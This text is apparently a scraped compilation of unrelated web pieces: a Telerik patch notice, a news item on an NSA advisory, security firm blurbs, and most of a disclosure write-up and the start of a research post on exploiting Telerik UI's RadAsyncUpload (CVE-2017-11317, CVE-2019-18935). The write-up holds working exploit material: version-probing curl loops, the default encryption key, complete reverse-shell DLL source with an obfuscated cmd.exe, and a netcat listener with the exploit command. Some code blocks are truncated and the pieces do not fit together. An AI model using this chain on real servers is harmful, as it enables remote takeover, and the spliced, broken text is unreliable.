> The R2 2017 SP2 release brings a fix and the ability to disable uploads for the first time. This fix was ported in the patches.
>
> Download a patched version from your Telerik.com account **after the 15th of August 2017**. If you downloaded it earlier, download it again, because the file was updated since its [original creation](https://www.telerik.com/%3Esupport/kb/aspnet-ajax/details/cryptographic-weakness).
>
> Steps to get the patch:
>
> 1. Go to your [Telerik.com account](https://www.telerik.com/account/product-download?product=RCAJAX).

> 2. From the Version dropdown, select your release:

> ![Version Dropdown](/products/aspnet-ajax/documentation/assets/2f8d2045eeb4bd118c167086b02aecdc/asyncupload-insecure-direct-object-reference-version-dropdown.png)

> 3. Download the `SecurityPatch_<your_version>.zip` file.

> 4. [Replace the Telerik.Web.UI assembly in your application](http://docs.telerik.com/devtools/aspnet-ajax/installation/upgrading-instructions/upgrading-a-trial-to-a-developer-license-or-to-a-newer-version#manual-upgrade) >with the one of the same version that you just downloaded. Temporary files saved to the disk by RadAsyncUpload will now have the `.tmp` extension.

> 5. *(Updated on 23 Oct 2019):* Set the encryption keys described in the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security).
>
> This patch brings an added security measure. After applying the patched DLL, you can now [disable file uploads through the Telerik handler](http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/%3Esecurity#disableasyncuploadhandler). To do that, set the **Telerik.Web.DisableAsyncUploadHandler** key in the `appSettings` section of your web.config to **true**. You can then [create a custom handler](http://docs.telerik.%3Ecom/devtools/aspnet-ajax/controls/asyncupload/how-to/how-to-extend-the-radasyncupload-handler) with the desired level of security.
>
> **NOTE:** Due to technical feasibility, the following versions do not have patches for this issue:
>
> * Q1 2011 SP2 (2011.1.519)
> * Q2 2011 SP1 (2011.2.915)
> * Q3 2011 SP1 (2011.3.1305)
> * Q1 2012 SP1 (2012.1.411)
> * Q2 2012 SP2 (2012.2.912)
>
> The patched version shows "Telerik.Web.UI.Patch" in the File Description under Properties in Windows Explorer:
>
> ![Patched Version](/products/aspnet-ajax/documentation/assets/5fa5984141baf71e65c0e68f0fbe50a4/asyncupload-insecure-direct-object-reference-patched-version.png)
>

>
> #### [Upgrade to R2 2017 SP2 (2017.2.711) or later if you're on active maintenance](#upgrade-to-r2-2017-sp2-2017-2-711-or-later-if-you-re-on-active-maintenance)
>
> 1. [Upgrade your Telerik UI for ASP.NET AJAX version](http://docs.telerik.com/devtools/aspnet-ajax/installation/upgrading-instructions/%3Eupgrading-a-trial-to-a-developer-license-or-to-a-newer-version#upgrade-to-a-newer-version-of-telerik-ui-for-aspnet-ajax) to R2 2017 SP2 (2017.2.711) or later.
> 2. Set the encryption keys as explained in the [RadAsyncUpload Security article](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security).
>
> The R2 2017 SP2 (2017.2.711) release brings an additional security measure. It allows you to [disable file uploads through the Telerik handler](http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/%3Esecurity#disableasyncuploadhandler). To do that, set the **Telerik.Web.DisableAsyncUploadHandler** key in the `appSettings` section of your web.config to **true**.

![NSA China](https://www.bleepstatic.com/content/hl-images/2020/10/20/china-flag-nsa.jpg)

The U.S. National Security Agency (NSA) warns that Chinese state-sponsored hackers exploit 25 different vulnerabilities in attacks against U.S. organizations and interests.

In an [advisory](https://www.nsa.gov/News-Features/News-Stories/Article-View/Article/2387347/nsa-warns-chinese-state-sponsored-malicious-cyber-actors-exploiting-25-cves/) issued today, the NSA said that it is aware of targeted attacks by Chinese state-sponsored hackers against National Security Systems (NSS), the U.S. Defense Industrial Base (DIB), and the Department of Defense (DoD) information networks.

As part of these attacks, the NSA has seen twenty-five publicly disclosed vulnerabilities exploited to gain access to networks, deploy malicious mobile apps, and spread laterally through a system while attackers steal sensitive data.

The NSA is advising all organizations to immediately patch vulnerable devices to protect against cyberattacks that lead to data theft, banking fraud, and ransomware attacks.

“We hear loud and clear that it can be hard to prioritize patching and mitigation efforts,” NSA Cybersecurity Director Anne Neuberger [said](https://www.nsa.gov/News-Features/News-Stories/Article-View/Article/2387347/nsa-warns-chinese-state-sponsored-malicious-cyber-actors-exploiting-25-cves/).

“We hope that by highlighting the vulnerabilities that China is actively using to compromise systems, cybersecurity professionals will gain actionable information to prioritize efforts and secure their systems."

## Vulnerabilities used in different phases of attack

The NSA has categorized [the vulnerabilities](https://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF) into different buckets to illustrate how they are being used in cyberattacks.

**Exploit secure remote access:** To gain access to networks, Chinese threat actors utilize seven different vulnerabilities, many of which also provide credentials that can be used to spread further on the network.

# Sliver

Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver's implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.

The server and client support MacOS, Windows, and Linux. Implants are supported on MacOS, Windows, and Linux (and possibly every Golang compiler target but we've not tested them all).

About us

![CODE WHITE LOGO](https://code-white.com/images/Logo_Wortmarke_vert_weiss.svg)

 CODE WHITE provides premier cyber security services to its clients and has its own approach to information security:
uncompromising realism.

# Intelligence Driven Security

CODE WHITE seasoned experts introduce the attacker's point of view and simulate highly capable, real-world attackers by using their current tactics, tools and procedures.

The holistic approach of CODE WHITE helps clients by augmenting their internal view of the security posture (â Compliance Driven Security) with that of a professional attacker (â Intelligence Driven Security). This enables a better understanding of how real attacks will affect them and which defensive efforts are the most effective ones. All available systems, applications and information are always in focus.

## Compliance Driven Security

* Limited view from the inside
* Security certifications
* Compliance standards
* Legal requirements

# vs.

## Intelligence Driven Security

![](./images/security-icons_intelligence.png)

* Holistic view from the outside
* Realistic mindset of attackers
* Exploitable attack paths
* Relevant vulnerabilities only

Modern corporationsâ attack surface is continuously exposed to attacks. CODE WHITE constantly monitors the clientâs attack surface for security-relevant changes and vulnerabilities. Clients are pro-actively notified with actionable information about issues the moment they arise. Since only relevant issues are reported, these notifications are âall signal â no noiseâ. The independent evaluation of the clientâs security posture allows CODE WHITE to assess the effectiveness of defensive efforts and to advance strategies that matter.

Based on this INTELLIGENCE DRIVEN SECURITY approach, CODE WHITE offers two exclusive services:

# Initial Assessment

The INITIAL ASSESSMENT (INI) simulates a real cyber attack in the form of a holistic RedTeam scenario. The purpose is to understand the approach of real attackers, to gain transparency about how vulnerable an enterprise currently is and to gauge its level of defense. This approach helps to significantly improve resilience against real threat actors.

![](./images/initial-workflow_icon_1.png)

Identify & exploit vulnerabilities in the complete internet footprint (including phishing)

![](./images/initial-workflow_icon_2.png)

Move laterally & compromise neuralgic IT systems and administrative accounts

![](./images/initial-workflow_icon_3.png)

Avoid detection, establish persistence, exfiltrate data and point out business risks

![](./images/initial-workflow_icon_4.png)

Generate extensive documentation of the attacks done including precise & strategic recommendations

# Security Intelligence Service

The continuous SECURITY INTELLIGENCE SERVICE (SIS) offers continuous
support from an attackerâs perspective. The relevant attack surface is
constantly and carefully assessed, exploitable vulnerabilities are
reported expeditiously and emerging threats are announced immediately.

An INITIAL ASSESSMENT typically leads to a partnership with CODE WHITE
wherein the SECURITY INTELLIGENCE SERVICE provides âthe hacker at the
tableâ for an extended duration. Within such a partnership, clients have
access to specialized services including but not limited to RedTeam
assessments, threat intelligence, penetration tests, product security
reviews or customized training. This helps clients stay ahead of threats
and sustainably improve their security resilience level over time.

[Telerik UI for ASP.NET AJAX](https://www.telerik.com/products/aspnet-ajax.aspx) is a widely used suite of UI components for web applications. It insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host. The Managed Security Services (MSS) team at Bishop Fox has identified and exploited internet-facing instances of Telerik UI affected by this vulnerability for our clients. Since Telerik has just responded to this issue by releasing a [security advisory for CVE-2019-18935](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization), we're sharing our knowledge about it here in an effort to raise awareness about the severity of this vulnerability, and to encourage affected users to patch and securely configure this software. Patching instructions are included at the end of this post.

Thanks to Markus Wulftange ([@mwulftange](https://twitter.com/mwulftange)) of Code White GmbH for initially discovering this insecure deserialization vulnerability and for summarizing his research. Thanks also to Paul Taylor [(@bao7uo](https://github.com/bao7uo)) who, after authoring an [exploit](https://github.com/bao7uo) to break encryption for an unrestricted file upload vulnerability, developed an extended custom payload feature that was instrumental in triggering this deserialization vulnerability.

## Vulnerability Details

The following sections will walk through two vulnerabilities in RadAsyncUpload, which is a file handler in Telerik UI for ASP.NET AJAX that enables uploading files asynchronously (i.e., without reloading the existing page). After covering the context of those two CVEs, we’ll dive deeper into the insecure deserialization vulnerability to learn if it affects your system, how the exploit works, and how you can patch systems against this vulnerability.

### Overview of Vulnerabilities in RadAsyncUpload

RadAsyncUpload has previously been the subject of a number of vulnerabilities, including CVE-2014-2217, which is a path traversal vulnerability in the handler's file upload POST requests that results in unrestricted file upload. (Don't confuse it with CVE-2017-11317, which also yields unrestricted file upload, but through a different vector…more on that shortly.)

CVE-2014-2217 is outside of the scope of this post, but it's important that we mention it here, since Telerik responded to this issue by encrypting a particular portion of file upload requests to prevent attackers from tampering with sensitive settings. Specifically, Telerik encrypted the `rauPostData` POST parameter, which contains a serialized object that holds configuration details about how the file should be handled (e.g., the destination directory on the web server where the file should be uploaded). If attackers were able to break the encryption protecting the configuration object in `rauPostData`, they could:

* Modify the configuration to allow file uploading anywhere they like on the target web server. This issue (CVE-2017-11317) is a well-known vulnerability and has already been reported on.
* Modify the type of the object in `rauPostData`, allowing them to control the object's behavior while it's being deserialized. This issue (CVE-2019-18935) is the main subject of this post.

In summary, in order to exploit insecure deserialization (CVE-2019-18935) in this file handler, we must first break the encryption that the handler uses to protect file upload POST requests (CVE-2017-11317).

### CVE-2017-11317 - Unrestricted File Upload via Weak Encryption

Until R2 2017 SP1 (v2017.2.621), RadAsyncUpload's `AsyncUploadHandler` was configured with a hard-coded key that was used to encrypt form data in file upload requests. If this encryption key was not changed from its default value of `PrivateKeyForEncryptionOfRadAsyncUploadConfiguration`, an attacker could use that key to craft a file upload request to `/Telerik.Web.Ui.WebResource.axd?type=rau` with a custom encrypted `rauPostData` POST parameter. If an attacker specified an arbitrary value for the `TempTargetFolder` variable within the encrypted `rauPostData` POST parameter, it would effectively allow file uploads to any directory where the web server had write permissions. Please refer to [@straightblast's write-up](https://github.com/straightblast/UnRadAsyncUpload/wiki) for a detailed breakdown of `rauPostData`'s structure (and of this vulnerability in general), and Telerik's [security advisory](https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/unrestricted-file-upload) for how this vulnerability was remediated.

### CVE-2019-18935 - Remote Code Execution via Insecure Deserialization

Even though the unrestricted file upload vulnerability had been extensively discussed since its discovery in 2017, Markus Wulftange [took a closer look](https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html) at the way RadAsyncUpload processed the `rauPostData` parameter in file upload requests in early 2019. He noted that `rauPostData` contains both the serialized configuration object **and** the object's type. `AsyncUploadHandler` uses the type specified within `rauPostData` to prepare .NET's [`JavaScriptSerializer.Deserialize()`](https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer.deserialize?view=netframework-4.8) method to properly deserialize the object.

During deserialization, `JavaScriptSerializer` calls setter methods for the specified object type. If this type is controlled by an attacker, this can lead to a dangerous scenario where the attacker may specify the type to be a [gadget](https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles). A gadget is a class within the executing scope of the application that, as a side effect of being instantiated and modified via setters or field assignment, has special properties that make it useful during deserialization. A remote code execution (RCE) gadget's properties allow it to perform operations that facilitate executing arbitrary code.

Rather than submitting the usual expected `Telerik.Web.UI.AsyncUploadConfiguration` type within `rauPostData`, an attacker can submit a file upload POST request specifying the type as an RCE gadget instead. After using the aforementioned unrestricted file upload vulnerability to upload a malicious mixed mode assembly DLL, an attacker may follow up with a second request to force `JavaScriptSerializer` to deserialize an object of type `<a href="https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8" target="_blank" rel="noreferrer noopener">System.Configuration.Install.AssemblyInstaller</a>`. When deserialized along with an attacker-supplied [path](https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8) property pointing to the uploaded DLL, this will cause the application to load the DLL into its current domain. As long as the mixed mode assembly DLL is of the same architecture as the loading process, its entry-point function [DDLMain()](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain) will be called when the DLL is loaded. For more details, please refer to Implications of Loading .NET Assemblies and [Friday the 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf).

### OK, What's a Mixed Mode Assembly?

According to MSDN, a [mixed mode assembly](https://docs.microsoft.com/en-us/cpp/dotnet/mixed-native-and-managed-assemblies?view=vs-2019) contains "both unmanaged machine instructions and [CIL] instructions." If you're unfamiliar with the .NET framework, then these terms may not mean anything to you. Let's break these down a bit, starting with a useful description from Wikipedia about how programs execute when developed in .NET:

Programs written for .NET Framework execute in a software environment (in contrast to a hardware environment) named the Common Language Runtime (CLR). The CLR is an application virtual machine that provides services such as security, memory management, and exception handling. As such, computer code written using .NET Framework is called "managed code."

So, "managed" code is written to run exclusively under the CLR, a layer that wraps native compiled code to prevent some common problems (e.g., buffer overflows) and abstract away some platform-specific implementation details to make code more portable. C# is often considered a managed language as it's typically compiled to CIL (Common Intermediate Language—a platform-independent language between source code and final native machine code) to be run under the CLR. CIL, in turn, is compiled into native code by a just-in-time compiler within the CLR. Conversely, code that does *not* target the CLR is known as "unmanaged" code (e.g., your average C program).

An [assembly](https://docs.microsoft.com/en-us/dotnet/standard/assembly/) is a package containing precompiled CIL code that can be executed in the CLR. It is the most fundamental unit of deployment for a .NET application, and can be implemented as an EXE or DLL file. An assembly also contains a manifest that details, among other things, metadata about the assembly's name and version. For further reading, check out this [article about injecting .NET assemblies](https://thewover.github.io/Introducing-Donut/) which provides a useful .NET primer, and a related article on [mixed assemblies](https://thewover.github.io/Mixed-Assemblies/).

## CVE-2019-18935 Exploit Details

Now with our background knowledge of the prerequisite unrestricted file upload vulnerability (CVE-2017-11317), the deserialization vulnerability itself, and mixed mode assemblies, we can now explore this exploit step by step.

### Identify Software Version

Before attempting to exploit Telerik UI for ASP.NET AJAX, confirm first that the file upload handler is registered:

```
curl -sk <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
{ "message" : "RadAsyncUpload handler is registered successfully, however, it may not be accessed directly." }

```

Additionally, you’ll need to confirm that the web application is using a vulnerable version of this software. Conveniently, Telerik publishes a [release history](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history) that details all major software versions since April 2007.

#### Without Authentication

If the application using RadAsyncUpload does not require authentication, then you can usually find the UI version buried somewhere in the HTML source of the application's home page. The location of the version string isn't consistent, though, so the best method of locating it is to use Burp to [search](https://portswigger.net/burp/documentation/desktop/functions/search) for the regular expression `20[0-9]{2}(\.[0-9]*)+` (and make sure you check the "Regex" box). You can also accomplish this with cURL:

```
curl -skL <HOST> | grep -oE '20[0-9]{2}(\.[0-9]*)+'
```

If that doesn't work, you can alternatively search for the string `<script src="/WebResource` to identify any JavaScript files that are included in the site's home page. Choose one of the static resources there and examine its `Last-Modified` date in the HTTP response header; that date should roughly match the release date of the software. For example, a JavaScript resource bundled with UI for ASP.NET AJAX Q1 2013 (v2013.1.220, released on February 20, 2013) will read `Last-Modified: Wed, 20 Feb 2013 00:00:00 GMT` in the HTTP response header for that file.

#### With Authentication

If the application **does** require authentication, then you may be able to determine the software version via brute force. Since uploading a file with RadAsyncUpload requires providing the correct version of Telerik UI, you can use Paul Taylor’s [RAU\_crypto](https://github.com/bao7uo/RAU_crypto) exploit to submit file upload requests with known-vulnerable versions until you find one that works:

```
echo 'test' > testfile.txt
for VERSION in 2007.1423 2007.1521 2007.1626 2007.2918 2007.21010 2007.21107 2007.31218 2007.31314 2007.31425 2008.1415 2008.1515 2008.1619 2008.2723 2008.2826 2008.21001 2008.31105 2008.31125 2008.31314 2009.1311 2009.1402 2009.1527 2009.2701 2009.2826 2009.31103 2009.31208 2009.31314 2010.1309 2010.1415 2010.1519 2010.2713 2010.2826 2010.2929 2010.31109 2010.31215 2010.31317 2011.1315 2011.1413 2011.1519 2011.2712 2011.2915 2011.31115 2011.3.1305 2012.1.215 2012.1.411 2012.2.607 2012.2.724 2012.2.912 2012.3.1016 2012.3.1205 2012.3.1308 2013.1.220 2013.1.403 2013.1.417 2013.2.611 2013.2.717 2013.3.1015 2013.3.1114 2013.3.1324 2014.1.225 2014.1.403 2014.2.618 2014.2.724 2014.3.1024 2015.1.204 2015.1.225 2015.2.604 2015.2.623 2015.2.729 2015.2.826 2015.3.930 2015.3.1111 2016.1.113 2016.1.225 2016.2.504 2016.2.607 2016.3.914 2016.3.1018 2016.3.1027 2017.1.118 2017.1.228 2017.2.503 2017.2.621 2017.2.711 2017.3.913; do
    echo -n "$VERSION: "
    python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt <HOST>/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo done

```

When the file upload succeeds, you'll see a JSON response containing some encrypted data about the uploaded file:

```
{"fileInfo":{"FileName":"<NAME>","ContentType":"text/html","ContentLength":<LENGTH>,"DateJson":"<DATE>","Index":0}, "metaData":"VGhpcyBpc24ndCByZWFsIGRhdGEsIGJ1dCB0aGUgQmFzZTY0LWVuY29kZWQgZGF0YSBsb29rcyBqdXN0IGxpa2UgdGhpcy4=" }
```

Now that you’ve verified that the handler is registered and the software is using a vulnerable version, you can proceed to exploit the vulnerability.

### Verify Deserialization Vulnerability with Sleep()

In preparing to fully compromise a remote host with a reverse shell, you can initially verify the deserialization vulnerability by uploading and loading a simple mixed mode assembly DLL that causes the web application to sleep for 10 seconds. A simple program, `sleep.c`, will do just that.

*Note that I use C, rather than C++, because I've encountered rare occasions where I was unable to execute compiled C++ code on a remote server. I suspect that this is because the target environment did not have the Microsoft Visual C++ Redistributable installed.*

[sleep.c](https://github.com/noperator/CVE-2019-18935/blob/master/sleep.c)

```
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
<b>    if</b> (fdwReason == DLL_PROCESS_ATTACH)
<b>        Sleep</b>(10000);  // Time interval in milliseconds.
<b>    return</b> TRUE;
}

```

Create a bare C# class in `empty.cs` to constitute the managed portion of your mixed mode assembly:

```
<b>class</b> Empty {}

```

Then, in a Windows environment with Visual Studio installed, open a command prompt and run `build_dll.bat sleep.c`: [build\_dll.bat](https://github.com/noperator/CVE-2019-18935)

```

    cl /c %PROGRAM%
    link /DLL /LTCG /CLRIMAGETYPE:IJW /out:%BASENAME%_%DATETIME%_%%a.dll %BASENAME%.obj empty.netmodule
    del %BASENAME%.obj empty.netmodule
    endlocal
)
```

```

This batch script accomplishes the following:

* Sets environment variables to compile both 32- and 64-bit code
* Compiles the `empty.cs` C# program as a `.netmodule` file (without generating an assembly)
* Compiles the specified C program (`sleep.c`, in this case) as an `.obj` file (without linking)
* Links the compiled `.netmodule` and `.obj` files, which creates a mixed mode assembly DLL with a unique name

#### A Cautionary Note About Assembly Names

The assembly's name as specified in `link /out` is baked into the assembly's manifest, and will persist even if the file name changes on disk. It's crucial that the assembly is uniquely named at linking time since a .NET application will **only load an assembly once** with a given name. This means that an assembly "`sleep_123.dll`" may cause the application to sleep the first time that DLL is loaded through deserialization, but it certainly won't successfully load again; you'll need to rerun `build_dll.bat` to generate a new assembly for each exploit attempt on the same server.

Before uploading the DLL, it's important to understand what's going to happen on disk on the remote server. RadAsyncUpload will upload your file to a temporary directory whose location is under your control. If you happen to upload two files with the same name (we're talking about file names on disk, not assembly names in a manifest), RadAsyncUpload will *append* (not overwrite!) the new file to the old one. If the application attempts to load the resulting malformed DLL, it can cause the application to crash—so it's extremely important that you use a unique file name each time you upload a file to the target.

#### Exploit

The following exploit script leverages the core RadAsyncUpload encryption logic provided by Paul Taylor's `RAU_crypto.py` to craft an encrypted `rauPostData` POST parameter; this enables access to the vulnerable `AsyncUploadHandler` class through which we can upload files and deserialize arbitrary object types. This script also ensures that each uploaded file has a unique name on disk.

Without being able to remotely determine the architecture of the web server's underlying host, you may need to attempt to trigger this vulnerability with both the 32- and 64-bit DLL versions until you find one that works. Invoke the script as follows:

```

[*] Local payload name:  sleep_2019121205271355_x86.dll

              'Index': 0},

                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',

<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds

```

If the application pauses for approximately 10 seconds before responding, you've got a working deserialization exploit!

### Exploit with Reverse Shell

Now that we've verified that we can exploit this vulnerable version of Telerik UI for ASP.NET AJAX, we can instead exploit it with a DLL that spawns a reverse shell to connect back to a server that we control. We use `rev_shell.c` below, a program that launches a reverse shell as a thread when the DLL is loaded; the threaded nature of this program prevents the shell process from blocking the web application's user interface while running: [rev\_shell.c](https://github.com/noperator/CVE-2019-18935)

```
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

#define HOST "<HOST>"
#define PORT <PORT>

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

// Adapted from https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c
void ReverseShell()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host = gethostbyname(HOST);
    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(PORT);
    hax.sin_addr.s_addr = inet_addr(aip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    if (WSAGetLastError() == 0) {

        memset(&ini_processo, 0, sizeof(ini_processo));

        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        char *myArray[4] = { "cm", "d.e", "x", "e" };
        char command[8] = "";
        snprintf(command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    }
}

DWORD WINAPI MainThread(LPVOID lpParam)
{
    ReverseShell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread;

    if (fdwReason == DLL_PROCESS_ATTACH)
        hThread = CreateThread(0, 0, MainThread, 0, 0, 0);

    return TRUE;
}

```

Modify `rev_shell.c` with the hostname and port of the C2 server where you'll be listening for a callback:

```
sed -i .bu 's/<HOST>/<HOST>/; s/<PORT>/<PORT>/' rev_shell.c

```

Using the same method of compiling and linking described above, generate your mixed mode assembly DLL:

```
build_dll.bat rev_shell.c

```

Open a Netcat listener to catch the callback:

```
sudo ncat -lvp <PORT>

```

Then upload and load your DLL!

```
python3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\Windows\Temp' -p rev_shell_2019121205271355_x86.dll

```
## How to Patch

The [Telerik security advisory](https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization) tells you what you need to know, but we’ll repeat the most important parts here:

* Upgrade Telerik for ASP.NET AJAX to [R3 2019 SP1](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history/ui-for-asp-net-ajax-r3-2019-sp1-%28version-2019-3-1023%29) (v2019.3.1023) or later.
* Read Telerik's [RadAsyncUpload security guide](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security) in its entirety, and configure the control according to the [recommended security settings](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security#recommended-settings).

## Conclusion

This write-up has demonstrated how an attacker can chain exploits for unrestricted file upload (CVE-2017-11317) and insecure deserialization (CVE-2019-18935) vulnerabilities to execute arbitrary code on a remote machine.

In recent years, insecure deserialization has emerged as an effective attack vector for executing arbitrary code in object-oriented programming frameworks. As we continue to identify and understand this class of vulnerabilities, it’s important that vendors and users employ timely communication to combat the risk posed by vulnerable software. Now that Telerik has released a patch and security advisory for this vulnerability, affected users should do their part by updating and securely configuring their applications.

### Telerik Revisited

In 2017, several vulnerabilities were discovered in Telerik UI, a popular UI component library for .NET web applications. Although details and working exploits are public, it often proves to be a good idea to take a closer look at it. Because sometimes it allows you to explore new avenues of exploitation.

## Introduction

Telerik UI for ASP.NET is a popular UI component library for ASP.NET web applications. In 2017, several vulnerabilities were discovered, potentially resulting in remote code execution:

[CVE-2017-9248: Cryptographic Weakness](https://www.telerik.com/support/kb/aspnet-ajax/details/cryptographic-weakness)
A cryptographic weakness allows the disclosure of the encryption key (*Telerik.Web.UI.DialogParametersEncryptionKey* and/or the *MachineKey*) used to protect the *DialogParameters* via an oracle attack. It can be exploited to forge a functional file manager dialog and upload arbitrary files and/or compromise the ASP.NET ViewState in case of the latter.
[CVE-2017-11317: Hard-coded default key](https://www.telerik.com/support/kb/aspnet-ajax/upload-%27async%28/details/unrestricted-file-upload)
A hard-coded default key is used to encrypt/decrypt the *AsyncUploadConfiguration*, which holds the path where uploaded files are stored temporarily. It can be exploited to upload files to arbitrary locations.
[CVE-2017-11357: Insecure Direct Object Reference](https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/insecure-direct-object-reference)
The name of the file stored in the location specified in *AsyncUploadConfiguration* is taken from the request and thus allows the upload of files with arbitrary extension.

The vulnerabilities were fixed in R2 2017 SP1 (2017.2.621) and R2 2017 SP2 (2017.2.711), respectively. As for CVE-2017-9248, there is an [analysis by PatchAdvisor](https://web.archive.org/web/20170703163428/http%3A//www.patchadvisor.com/blog/?p=98)[[1]](#footnote-1) that gives some insights and exploitation hints. And regarding CVE-2017-11317, the detailed [writeup by @straight\_blast](https://github.com/straightblast/UnRadAsyncUpload/wiki) seems to have been published even half a year before Telerik published an updated version. It describes in detail how the vulnerability was discovered and how it can be exploited to upload an arbitrary file to an arbitrary location. If you're unfamiliar with these vulnerabilities, you may want to read the linked advisories first to get a better understanding.

## The Catch

Although the vulnerabilities sound promising, they all have their catch: exploiting CVE-2017-9248 requires many thousands of requests, which can be pretty noticeable and suspicious. And unless it is actually possible to leak the *MachineKey* (which would allow an exploitation via deserialization of arbitrary ObjectStateFormatter stream), a file upload to an arbitrary location (i. e., CVE-2017-11317) is still limited to the knowledge of an appropriate location with sufficient write permissions.

The problem here is that by default the account that the IIS worker process *w3wp.exe* runs with is a special account like *IIS AppPool\DefaultAppPool*. And such an account usually does not have write permissions to the web document root directory like *C:\inetpub\wwwroot* or similar. Additionally, the web document root of the web application can also be somewhere else and may not be known. So simply writing an ASP.NET web shell probably won't work in many cases.

## The Dead End

This was exactly the case when we faced Managed Workplace RMM by Avast Business in a red team assessment where we didn't want to make too much noise. Additionally, unauthenticated access to all *\*.aspx* pages except for *Login.aspx* was denied, i. e., the handler *Telerik.Web.UI.DialogHandler.aspx* for exploiting CVE-2017-9248 was not reachable, and the other one, *Telerik.Web.UI.SpellCheckHandler.axd*, was not registered. So, CVE-2017-11317 seemed to be the only option left.

By enumerating known versions of Telerik Web UI, one request to upload to *C:\Windows\Temp* was finally successful. But an upload to *C:\inetpub\wwwroot* did not succeed. And since we did not have access to an installation of Managed Workplace, we had no insights into its directory structure. So this seemed to be a dead end.

## The New Avenue

While tracing the path of the provided *rauPostData* through the Telerik code, there was one aspect that became apparent that was never mentioned before by anyone else: The exploitation of CVE-2017-11317 was always advertised as an arbitrary upload. This seems obvious as the handler's name is *AsyncUploadHandler* and *rauPostData* contains the upload configuration.

But after taking a closer look at the code that processes the *rauPostData*, it showed that the *rauPostData* is expected to consist of two parts separated by a `&`.

[![// Telerik.Web.UI.AsyncUpload.SerializationService
internal static object Deserialize(string obj, Type type)
{
 JavaScriptSerializer serializer = SerializationService.GetSerializer(obj.Length);
 SerializationService.ApplyConverters(type, serializer);
 MethodInfo methodInfo = typeof(JavaScriptSerializer).GetMethod("Deserialize", new Type[]
 {
  typeof(string)
 }, null).MakeGenericMethod(new Type[]
 {
  type
 });
 return methodInfo.Invoke(serializer, new object[]
 {
  obj
 });
}](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_tFYBbZnM0b0lJ6Rdm24HWCb3fW3Q1RpGSCyTZzAN-gDfq8RWs93gpkXRZyUbmF40QLnCm1hnZAgxVmMVRsw9hTlTuX2sTEIja3WAXjFrMdW3AgEAO-62npJCtTdLKeySH_2vTITAk_s/s640/Selection_2018-12-04_02.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_tFYBbZnM0b0lJ6Rdm24HWCb3fW3Q1RpGSCyTZzAN-gDfq8RWs93gpkXRZyUbmF40QLnCm1hnZAgxVmMVRsw9hTlTuX2sTEIja3WAXjFrMdW3AgEAO-62npJCtTdLKeySH_2vTITAk_s/s1600/Selection_2018-12-04_02.png)

The first part is the JSON data (line 9). And the second part is the assembly qualified type name (line 10) that the JSON data should be deserialize to. The call in line 11 then ends up in `SerializationService.Deserialize(string, Type)`.

[![// Telerik.Web.UI.AsyncUploadHandler
internal IAsyncUploadConfiguration GetConfiguration(string rawData)
{
 string[] array = rawData.Split(new char[]
 {
  '&'
 });
 string obj = array[0];
